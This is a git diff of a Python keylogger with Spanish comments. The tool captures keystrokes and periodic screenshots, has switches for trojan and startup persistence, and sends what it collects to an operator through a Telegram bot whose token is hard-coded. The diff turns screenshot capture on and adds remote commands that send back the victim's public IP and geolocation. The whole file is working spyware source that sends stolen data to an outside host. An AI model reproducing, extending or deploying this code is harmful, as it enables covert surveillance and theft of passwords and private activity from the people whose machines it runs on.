@@ -26,6 +26,8 @@ import shutil                   # Lib para crear carpetas
 import string                   # Lib genera textos
 import time                     # Contar segundos
 from PIL import ImageGrab       # Toma capturas de pantalla
+import urllib.request
+import json
 #endregion
 
 #region Code Main
@@ -42,21 +44,21 @@ class Config:
         self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY    # <No cambiar>
         self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME    # <No cambiar>
         self.USERNAME = getuser()                               # Windows UserName or custom name
-        self.TROJAN = False                                    # Active or disable function Trojan
-        self.STARTUP = False                                     # Active or diable function StarUp
-        self.SCREENSHOT = False                                  # active or disable function Screenshot
+        self.TROJAN = False                                     # Active or disable function Trojan
+        self.STARTUP = False                                    # Active or diable function StarUp
+        self.SCREENSHOT = True                                  # active or disable function Screenshot
         self.KEYLOGGER = True                                   # active or disable function Keylogger
-        self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
+        self.TIME_SCREENSHOT = 5*60 #[seconds]                   # Tiempo de intervalo de ScreenShot
         self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
         self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
     class TelegramBot:
         def __init__(self):
-            self.ID   = 83175                                                     # ID Principal [Obligatorio]
+            self.ID   = 8317                                                     # ID Principal [Obligatorio]
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM"             # TOKEN de tu Bot [Obligatorio]
             # Personalize
-            self.LEN_TEXT = 1  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+            self.LEN_TEXT = 1000  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 class Functions:
     def CurrentTime(self):
@@ -102,7 +104,7 @@ class Functions:
                 regk.close()
                 return False
         except:
-            print("[LenghtText] No se encontró el Archivo: " + Config().PATH_KEY)
+            print("[LenghtText] No se encontró el Archivo: " + Config().PATH_LOG)
             return False
 
 class Util:
@@ -170,7 +172,6 @@ class Util:
         print("[ScreenShot] Se tomó una captura ")
         imagen.save(path)
         print("[ScreenShot] Se guardó correctamente la captura")
-
     def TelegramBot(self):
         print("[TelegramBot] start....")
         if Functions().LenghtText():
@@ -200,8 +201,13 @@ class Util:
             print("[TelegramBot] Se eliminó el archivo caché correctamente")
         else:
             pass
-
-
+    def getIpPublic(self):
+        return "200.106.80.232"
+    def getIpInfo(self):
+        link = "https://ipinfo.io/"+self.getIpPublic()+"/json"
+        url = urllib.request.urlopen(link)  #Procesa la informacióm obtenida
+        cargar = json.loads(url.read()) # lee la la información
+        return cargar
 class Send:
     def __init__(self):
         pass
@@ -469,58 +475,49 @@ def handle(msg):
         bot.sendPhoto(ID, "https://i.imgur.com/SelWET0.png")
         print("[Command] /About Exitoso")
     elif command == "/screenshot":
-        pathScreen = Functions().pathRamdom_ScreenShot()
-        print(pathScreen)
-        Util().Screenshot(pathScreen)
-        #Util().SendBotScreenShot(bot,ID,pathScreen)
-        bot.sendChatAction(ID, 'upload_photo')
-        bot.sendDocument(ID, open(pathScreen, 'rb'))
-        # Se terminó de enviar
         try:
+            pathScreen = Functions().pathRamdom_ScreenShot()
+            print(pathScreen)
+            Util().Screenshot(pathScreen)
+            # Util().SendBotScreenShot(bot,ID,pathScreen)
+            bot.sendChatAction(ID, 'upload_photo')
+            bot.sendDocument(ID, open(pathScreen, 'rb'))
+            # Se terminó de enviar
             os.remove(pathScreen)
             print("[Command] /Screenshot Exitoso y se eliminó caché")
         except:
             print("[Command] /Screenshot Fallido y no se pudo eliminar el caché ")
-    elif command == "/screenshotd":
+    elif command == "/ipPublic":
+        bot.sendMessage(ID, "muestra ip publico")
+        #print("[Command] /IP Exitoso")
+    elif command == "/ipLocation":
+        bot.sendMessage(ID, "IP_info")
+        #print("[Command] /IP_info Exitoso")
+    elif command == "/ipInfo":
+        cargar = Util().getIpInfo()
+        for d in cargar:
+            print(d+": "+cargar[d])
+            bot.sendMessage(ID, d+": "+cargar[d])
+
+        print("[Command] /IP_Info Exitoso")
+    elif command == "/getKeylogger":
         bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screenshosdt":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screesdfnshot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screensfshot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screenssfhot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screenfssfhot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screfdgenssdfhot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
-    elif command == "/screenfdsdfshot":
-        bot.sendMessage(ID, "Scrrenshot")
-        print("[Command] /About Exitoso")
+        #print("[Command] /About Exitoso")
     else:
-        FUNCTIONELITIES = "Write "\
+        FUNCTIONALITIES = "Write "\
         "red_info => Información de la Red\n" \
         "/webcam   => Toma foto a la WebCam\n" \
         "/webcam   => Toma foto a la WebCam\n" \
-        "/webcam   => Toma foto a la WebCam\n" \
-        "/webcam   => Toma foto a la WebCam\n" \
-        "/keylogger_active     => Active Keylogger\n" \
-        "/keylogger_disable   => Disable Keylogger\n" \
-        "/keylogger_get          => Get keylog\n" \
+        "/ipPublic   => Muestra ip publico\n" \
+        "/ipLocation     => GeoIP\n" \
+        "/ipInfo      => información completa\n"\
+        "/getKeylogger      => Get keylog\n" \
         "/screenshot   => Take a screenshot\n" \
         "/webcam   => Toma foto a la WebCam\n" \
         "/webcam   => Toma foto a la WebCam\n" \
         "/about"
-        bot.sendMessage(ID, FUNCTIONELITIES)
-        print("[Command] /help other")
+        bot.sendMessage(ID, FUNCTIONALITIES)
+        print("[Command] /help ")
 
 # Starting Script
 if __name__ == '__main__':
@@ -535,14 +532,13 @@ if __name__ == '__main__':
     print("[Keylogger] Finish Delay")
     print("[Keylogger] Listening to Keys...")
     # Create and start threads
-
     threading.Thread(target=Send().Log).start()  # Envía Registro
     threading.Thread(target=Keylogger().GetKeys).start() if Config().KEYLOGGER else print("[Keylogger] Disable...")  # Registra pulsaciones
     threading.Thread(target=Send().ScreenShot).start() if Config().SCREENSHOT  else print("[ScreenShot] Disable...")  # Screenshot
 
     # Instancia Bot con Token
     bot = telepot.Bot(Config().TelegramBot().TOKEN)
-    bot.sendMessage(Config().TelegramBot().ID, "User: ["+Config().USERNAME + "] It is Online...")
+    bot.sendMessage(Config().TelegramBot().ID, " ["+Config().USERNAME + "] It is Online...")
     # Execute other thread what listening
     MessageLoop(bot, handle).run_as_thread()
     print('Listening ...')
